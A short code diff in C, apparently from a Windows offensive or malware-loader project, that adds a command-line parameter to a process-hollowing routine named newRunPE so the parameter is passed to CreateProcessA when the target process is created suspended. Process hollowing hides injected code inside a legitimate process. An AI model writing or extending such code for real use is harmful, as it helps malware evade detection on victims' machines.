@@ -336,7 +336,7 @@ DWORD get_pid_by_name(char *imgname)
 #endif
 
 #ifdef PROCESS_HOLLOWING
-void newRunPE(LPSTR szFilePath, PVOID pFile) {
+void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 	PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
 	PIMAGE_NT_HEADERS INH;				// NT .EXE header
 	PIMAGE_SECTION_HEADER ISH;			// Section Header
@@ -362,7 +362,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile) {
 				RtlZeroMemory(&PI, sizeof(PI));				
 		
 				// Create new instance of target process		
-				if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
 					CTX = (PCONTEXT) VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE);
 					CTX->ContextFlags = CONTEXT_FULL;
 					
